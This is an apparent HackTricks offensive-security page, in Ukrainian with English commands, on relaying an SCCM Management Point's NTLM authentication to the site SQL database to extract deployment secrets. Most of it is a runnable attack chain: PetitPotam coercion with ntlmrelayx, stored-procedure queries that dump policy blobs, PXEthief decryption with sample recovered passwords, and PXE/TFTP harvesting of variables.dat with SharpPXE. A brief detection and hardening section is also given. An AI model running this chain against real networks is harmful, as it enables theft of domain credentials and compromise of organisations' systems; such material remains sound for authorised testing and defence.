# SCCM Management Point NTLM Relay to SQL – Вилучення секретів політик OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Примусивши **System Center Configuration Manager (SCCM) Management Point (MP)** автентифікуватися через SMB/RPC і **relaying** цей NTLM машинний обліковий запис до **site database (MSSQL)**, ви отримуєте права `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ці ролі дозволяють викликати набір збережених процедур, які повертають бінарні політики **Operating System Deployment (OSD)** (облікові дані Network Access Account, змінні Task-Sequence тощо). Ці блоби закодовані у hex/зашифровані, але їх можна розкодувати та розшифрувати за допомогою **PXEthief**, отримавши відкриті тексти секретів.

Загальний ланцюжок:
1. Виявити MP і site DB ↦ неавторизований HTTP-ендпоінт `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Запустити `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Примусити MP до аутентифікації, використовуючи **PetitPotam**, PrinterBug, DFSCoerce тощо.
4. Через SOCKS-проксі підключитися за допомогою `mssqlclient.py -windows-auth` від імені ретрансльованого облікового запису **<DOMAIN>\\<MP-host>$**.
5. Виконати:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (або `MP_GetPolicyBodyAfterAuthorization`)
6. Видалити `0xFFFE` BOM, `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.

Секрети, такі як `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` тощо, відновлюються без взаємодії з PXE або клієнтами.

---

## 1. Перелі́к неавторизованих ендпоінтів MP
Розширення ISAPI MP — **GetAuth.dll** відкриває кілька параметрів, що не вимагають автентифікації (якщо сайт не PKI-only):

| Параметр | Призначення |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Повертає публічний ключ сертифіката підпису сайту + GUIDи пристроїв *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Повертає список усіх Management-Point у сайті. |
| `SITESIGNCERT` | Повертає сертифікат підпису Primary-Site (дозволяє ідентифікувати site server без LDAP). |

Витягніть GUIDи, які будуть виконувати роль **clientID** для подальших запитів до БД:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay обліковий запис машини MP на MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Коли примус спрацює, ви повинні побачити щось на кшталт:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Ідентифікуйте політики OSD за допомогою збережених процедур
Підключіться через SOCKS proxy (порт 1080 за замовчуванням):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Переключіться на **CM_<SiteCode>** DB (використайте 3-значний код сайту, напр. `CM_001`).

### 3.1  Знайти Unknown-Computer GUIDs (необов'язково)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Перелік призначених політик
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Кожен рядок містить `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Зосередьтесь на політиках:
* **NAAConfig**  – облікові дані Network Access Account
* **TS_Sequence** – змінні Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – може містити run-as accounts

### 3.3  Отримати повне тіло
Якщо ви вже маєте `PolicyID` & `PolicyVersion`, ви можете пропустити вимогу clientID, використавши:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ВАЖЛИВО: У SSMS збільшіть “Maximum Characters Retrieved” (>65535), інакше blob буде обрізано.

---

## 4. Декодування та розшифрування blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Приклад відновлених секретів:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Відповідні ролі та процедури SQL
Після relay логін відображається як:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ці ролі надають десятки дозволів EXEC; ключові, що використовуються в цій атаці, такі:

| Збережена процедура | Призначення |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Перелік політик, застосованих до `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Повертає повне тіло політики. |
| `MP_GetListOfMPsInSiteOSD` | Повертається через шлях `MPKEYINFORMATIONMEDIA`. |

Повний список можна переглянути за допомогою:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: надішліть запит PXE boot до Distribution Point, налаштованого для PXE. Відповідь proxyDHCP розкриває шляхи завантаження, такі як `SMSBoot\\x64\\pxe\\variables.dat` (зашифрована конфігурація) та `SMSBoot\\x64\\pxe\\boot.bcd`, а також опціональний зашифрований key blob.
* **Retrieve boot artifacts via TFTP**: використайте повернуті шляхи, щоб завантажити `variables.dat` через TFTP (без автентифікації). Файл невеликий (кілька КБ) і містить зашифровані змінні медіа.
* **Decrypt or crack**:
- Якщо відповідь містить ключ дешифрування, передайте його в **SharpPXE**, щоб розшифрувати `variables.dat` безпосередньо.
- Якщо ключ не надано (PXE media захищені кастомним паролем), SharpPXE генерує **Hashcat-compatible** `$sccm$aes128$...` хеш для офлайн-крейкінгу. Після відновлення пароля розшифруйте файл.
* **Parse decrypted XML**: у відкритому вигляді змінні містять метадані розгортання SCCM (**Management Point URL**, **Site Code**, GUIDи медіа та інші ідентифікатори). SharpPXE парсить їх і виводить готову до запуску команду **SharpSCCM** з попередньо заповненими параметрами GUID/PFX/site для подальшого зловмисного використання.
* **Requirements**: потрібна лише мережна досяжність до PXE listener (UDP/4011) та TFTP; локальні права адміністратора не потрібні.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – будь-який обліковий запис комп'ютера MP, що виконує вхід з IP, який не є його хостом ≈ relay.
2. Увімкніть **Extended Protection for Authentication (EPA)** для бази даних сайту (`PREVENT-14`).
3. Вимкніть невикористовуваний NTLM, забезпечте примусове підписування SMB, обмежте RPC (ті самі міри, що застосовуються проти `PetitPotam`/`PrinterBug`).
4. Посиліть захист зв'язку MP ↔ DB за допомогою IPSec / mutual-TLS.
5. **Constrain PXE exposure** – фаєрвольте UDP/4011 і TFTP до довірених VLAN, вимагайте PXE-паролі та налаштуйте сповіщення про завантаження через TFTP файлу `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
